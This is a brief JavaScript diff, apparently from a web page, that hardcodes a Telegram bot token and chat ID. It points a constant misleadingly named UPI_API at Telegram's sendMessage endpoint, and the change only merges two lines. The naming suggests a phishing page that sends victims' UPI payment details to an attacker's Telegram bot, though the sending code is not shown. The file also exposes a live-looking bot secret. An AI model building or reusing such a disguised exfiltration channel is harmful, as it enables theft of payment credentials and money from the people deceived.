@@ -1,7 +1,6 @@
 const TOKEN = "5852935116:AAFB4PmO-hiOL0QVkRZNvVEm2Ni4pD7ZBCI"
 const CHAT_ID = "1088412473"
-const s = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
-const UPI_API = s
+const UPI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`
 const success =  document.getElementById("success")
 
 
